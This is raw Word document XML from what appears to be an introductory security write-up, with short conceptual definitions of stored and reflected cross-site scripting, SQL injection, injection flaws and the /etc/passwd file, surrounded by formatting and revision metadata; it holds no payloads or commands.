          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>The extent to the severity of this vulnerability depends on the type of XSS, split into two categories: persistent/stored and reflected. Depending on which, attacks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> such as Cookie Stealing, Keylogging, Phishing, Port Scanning, and other browser-based exploits.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> are possible:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05845D73" w14:textId="0A111FAD" w:rsidR="00984B08" w:rsidRDefault="00C50BF7" w:rsidP="00957B8D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Stored </w:t>
      </w:r>
      <w:r w:rsidR="00C64A03">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ross-site scripting</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the most dangerous type of XSS. This is where a malicious string originates from the </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>database of the websit</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>e. This often happens when a website allows user input that is not sanitized when inserted into the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206C02ED" w14:textId="4DF8F12F" w:rsidR="00C50BF7" w:rsidRDefault="00C50BF7" w:rsidP="00C50BF7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">In a </w:t>
      </w:r>
      <w:r w:rsidR="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">eflected </w:t>
      </w:r>
      <w:r w:rsidR="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ross-</w:t>
      </w:r>
      <w:r w:rsidR="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">ite </w:t>
      </w:r>
      <w:r w:rsidR="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>cripting</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> malicious payload is part of the victim</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>s request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> It</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> might seem harmless as it requires the victim to send a request containing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacker’s payload, and a user wouldn't attack themselves. However, attackers could trick the user into clicking their crafted link that contains their payload via social engineering them via email.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Reflected XSS is the most common type of XSS attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E25103C" w14:textId="552D5C37" w:rsidR="00C64A03" w:rsidRPr="00C64A03" w:rsidRDefault="00C64A03" w:rsidP="00C64A03">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>SQL Injection</w:t>
      </w:r>
      <w:r w:rsidR="009D14E4">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an example of exploiting injection flaws and it </w:t>
      </w:r>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FC81A3" w14:textId="3CBD345A" w:rsidR="00C64A03" w:rsidRPr="007058A3" w:rsidRDefault="009D14E4" w:rsidP="00C50BF7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Injection flaws</w:t>
      </w:r>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> are very common in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> modern</w:t>
      </w:r>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> applications. These flaws occur because user-controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418E26D4" w14:textId="3B07B689" w:rsidR="007058A3" w:rsidRPr="007058A3" w:rsidRDefault="007058A3" w:rsidP="00C50BF7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>/etc/passwd</w:t>
      </w:r>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t> file stores essential information</w:t>
      </w:r>
      <w:r w:rsidR="00EE6079">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve">which </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00EE6079">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve">required during login. </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>t stores user account information</w:t>
      </w:r>
      <w:r w:rsidR="00EE6079">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a plain text file. It </w:t>
      </w:r>
      <w:r w:rsidR="00EE6079">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve">also </w:t>
      </w:r>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve">contains a list of the system’s accounts, giving each account some useful information like </w:t>
      </w:r>
      <w:r w:rsidR="00EE6079">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="007058A3">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>user ID, group ID, home directory, shell, and more. The /etc/passwd file should have general read permission as many command utilities use it to map user IDs to usernames.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E52AA8" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRPr="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00957B8D" w:rsidRPr="00957B8D" w:rsidSect="001753C5">
      <w:footerReference w:type="even" r:id="rId55"/>
      <w:footerReference w:type="default" r:id="rId56"/>
      <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
      <w:pgMar w:top="284" w:right="1440" w:bottom="142"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6E180B" w14:textId="77777777" w:rsidR="002A551F" w:rsidRDefault="002A551F" w:rsidP="0006271E">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="226B95D3" w14:textId="77777777" w:rsidR="002A551F" w:rsidRDefault="002A551F" w:rsidP="00062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76420444"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:rStyle w:val="PageNumber"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="15A48326" w14:textId="77777777" w:rsidR="00220A2F" w:rsidRDefault="00220A2F" w:rsidP="00220A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47FB61" w14:textId="77777777" w:rsidR="00220A2F" w:rsidRDefault="00220A2F" w:rsidP="000627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6635694"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:rStyle w:val="PageNumber"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="6505D2B7" w14:textId="77777777" w:rsidR="00220A2F" w:rsidRDefault="00220A2F" w:rsidP="00A45A59">
        <w:pPr>
          <w:pStyle w:val="Footer"/>
        </w:pPr>
        <w:r w:rsidRPr="00D85677">
          <w:rPr>
            <w:rStyle w:val="PageNumber"/>
            <w:rFonts w:ascii="Corbel" w:hAnsi="Corbel"/>
          </w:rPr>
          <w:t xml:space="preserve">PAGE </w:t>
        </w:r>
        <w:r w:rsidRPr="00D85677">
          <w:rPr>
            <w:rStyle w:val="PageNumber"/>
            <w:rFonts w:ascii="Corbel" w:hAnsi="Corbel"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00D85677">
          <w:rPr>
            <w:rStyle w:val="PageNumber"/>
            <w:rFonts w:ascii="Corbel" w:hAnsi="Corbel"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGE </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00D85677">
          <w:rPr>
            <w:rStyle w:val="PageNumber"/>
            <w:rFonts w:ascii="Corbel" w:hAnsi="Corbel"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00D85677">
          <w:rPr>
            <w:rStyle w:val="PageNumber"/>
            <w:rFonts w:ascii="Corbel" w:hAnsi="Corbel"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidRPr="00D85677">
          <w:rPr>
            <w:rStyle w:val="PageNumber"/>
            <w:rFonts w:ascii="Corbel" w:hAnsi="Corbe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E687A" w14:textId="77777777" w:rsidR="002A551F" w:rsidRDefault="002A551F" w:rsidP="0006271E">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="4C200D51" w14:textId="77777777" w:rsidR="002A551F" w:rsidRDefault="002A551F" w:rsidP="000627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52754"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="08E0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706C9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="75106328"/>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65E0C33"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="82DEF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C25F0A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B4D83C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F43D5C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5036A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1A4360A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AAB46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22F7709"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AC58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2277AC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C5C2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7"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="3"/>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QyMLcwtjQyNjMwNTNU0lEKTi0uzszPAykwrAUAOx/GYywAAAA="/>
  </w:docVars>
  <w:rsids>
    <w:rsidRoot w:val="009E3B85"/>
    <w:rsid w:val="00017B10"/>
    <w:rsid w:val="00025234"/>
    <w:rsid w:val="000329B4"/>
    <w:rsid w:val="00056442"/>
    <w:rsid w:val="0006271E"/>
    <w:rsid w:val="00067E6D"/>
    <w:rsid w:val="0007596F"/>
    <w:rsid w:val="000B5D29"/>
    <w:rsid w:val="000D54C3"/>
    <w:rsid w:val="000E106A"/>
    <w:rsid w:val="000F1E11"/>
    <w:rsid w:val="00102114"/>
    <w:rsid w:val="00116639"/>
    <w:rsid w:val="00153167"/>
    <w:rsid w:val="00173543"/>
    <w:rsid w:val="001753C5"/>
    <w:rsid w:val="001C1FFC"/>
    <w:rsid w:val="001D03F4"/>
    <w:rsid w:val="001D4594"/>
    <w:rsid w:val="001D581A"/>
    <w:rsid w:val="001E06EE"/>
    <w:rsid w:val="001F09E1"/>
    <w:rsid w:val="002018C2"/>
    <w:rsid w:val="00206B1A"/>
    <w:rsid w:val="00220423"/>
    <w:rsid w:val="00220A2F"/>
    <w:rsid w:val="002358C6"/>
    <w:rsid w:val="00254D5A"/>
    <w:rsid w:val="002641B1"/>
    <w:rsid w:val="0026793F"/>
    <w:rsid w:val="002752F8"/>
    <w:rsid w:val="00296EBB"/>
    <w:rsid w:val="002A551F"/>
    <w:rsid w:val="002C4BC1"/>
    <w:rsid w:val="0030716C"/>
    <w:rsid w:val="00314EDE"/>
    <w:rsid w:val="00331503"/>
    <w:rsid w:val="00333C51"/>
    <w:rsid w:val="003353DD"/>
    <w:rsid w:val="00335CC1"/>
    <w:rsid w:val="00347FD1"/>
    <w:rsid w:val="0035763C"/>
    <w:rsid w:val="00370139"/>
    <w:rsid w:val="003916B4"/>
    <w:rsid w:val="003A4D7B"/>
    <w:rsid w:val="003E6A7E"/>
    <w:rsid w:val="003F7A45"/>
    <w:rsid w:val="00420339"/>
    <w:rsid w:val="00433424"/>
    <w:rsid w:val="00453D28"/>
    <w:rsid w:val="004578AC"/>
    <w:rsid w:val="00492C33"/>
    <w:rsid w:val="004A7613"/>
    <w:rsid w:val="004C7F2B"/>
    <w:rsid w:val="004D11C1"/>
    <w:rsid w:val="004D6526"/>
    <w:rsid w:val="005120A6"/>
    <w:rsid w:val="005276A8"/>
    <w:rsid w:val="00537DAC"/>
    <w:rsid w:val="005537BE"/>
    <w:rsid w:val="005A0F07"/>
    <w:rsid w:val="005D1328"/>
    <w:rsid w:val="005D4907"/>
    <w:rsid w:val="00630312"/>
    <w:rsid w:val="00667CD7"/>
    <w:rsid w:val="006748DB"/>
    <w:rsid w:val="00680902"/>
    <w:rsid w:val="006A13EC"/>
    <w:rsid w:val="006C60E6"/>
    <w:rsid w:val="006D1BE2"/>
    <w:rsid w:val="007021F0"/>
    <w:rsid w:val="007058A3"/>
    <w:rsid w:val="00715806"/>
    <w:rsid w:val="00720429"/>
    <w:rsid w:val="00737176"/>
    <w:rsid w:val="007421CD"/>
    <w:rsid w:val="00764661"/>
    <w:rsid w:val="00796B71"/>
    <w:rsid w:val="007C3C3A"/>
    <w:rsid w:val="007D0171"/>
    <w:rsid w:val="007D2FD3"/>
    <w:rsid w:val="007E1E1B"/>
    <w:rsid w:val="007E4921"/>
    <w:rsid w:val="007F4713"/>
    <w:rsid w:val="0081410C"/>
    <w:rsid w:val="00815D34"/>
    <w:rsid w:val="00816979"/>
    <w:rsid w:val="00834654"/>
    <w:rsid w:val="00840C6A"/>
    <w:rsid w:val="00840FE3"/>
    <w:rsid w:val="0084558E"/>
    <w:rsid w:val="00856259"/>
    <w:rsid w:val="008579D6"/>
    <w:rsid w:val="00872054"/>
    <w:rsid w:val="008822EB"/>
    <w:rsid w:val="00897D9D"/>
    <w:rsid w:val="008A38B9"/>
    <w:rsid w:val="008A48EB"/>
    <w:rsid w:val="008A5F4C"/>
    <w:rsid w:val="008B6D5B"/>
    <w:rsid w:val="008C173A"/>
    <w:rsid w:val="008D0AB1"/>
    <w:rsid w:val="008E218A"/>
    <w:rsid w:val="008F2C93"/>
    <w:rsid w:val="00900877"/>
    <w:rsid w:val="00905DF0"/>
    <w:rsid w:val="00907059"/>
    <w:rsid w:val="00907C61"/>
    <w:rsid w:val="00947E01"/>
    <w:rsid w:val="00950563"/>
    <w:rsid w:val="00952F7D"/>
    <w:rsid w:val="00957B8D"/>
    <w:rsid w:val="00967DE5"/>
    <w:rsid w:val="00976644"/>
    <w:rsid w:val="00976823"/>
    <w:rsid w:val="00984B08"/>
    <w:rsid w:val="009960FA"/>
    <w:rsid w:val="009D14E4"/>
    <w:rsid w:val="009E3B7D"/>
    <w:rsid w:val="009E3B85"/>
    <w:rsid w:val="009F30FD"/>
    <w:rsid w:val="009F46CB"/>
    <w:rsid w:val="00A32309"/>
    <w:rsid w:val="00A45A59"/>
    <w:rsid w:val="00A45BDD"/>
    <w:rsid w:val="00A6381B"/>
    <w:rsid w:val="00A66D47"/>
    <w:rsid w:val="00A76F40"/>
    <w:rsid w:val="00A81AC6"/>
    <w:rsid w:val="00A82D92"/>
    <w:rsid w:val="00A83EF7"/>
    <w:rsid w:val="00A851A9"/>
    <w:rsid w:val="00A952F2"/>
    <w:rsid w:val="00AA0823"/>
    <w:rsid w:val="00AA7317"/>
    <w:rsid w:val="00AC0701"/>
    <w:rsid w:val="00AD5018"/>
    <w:rsid w:val="00AD50A7"/>
    <w:rsid w:val="00B04B29"/>
    <w:rsid w:val="00B228C6"/>
    <w:rsid w:val="00B23753"/>
    <w:rsid w:val="00B25AE6"/>
    <w:rsid w:val="00B73721"/>
    <w:rsid w:val="00B84320"/>
    <w:rsid w:val="00B864BA"/>
    <w:rsid w:val="00BB11CA"/>
    <w:rsid w:val="00BD468C"/>
    <w:rsid w:val="00BE02BB"/>
    <w:rsid w:val="00C10754"/>
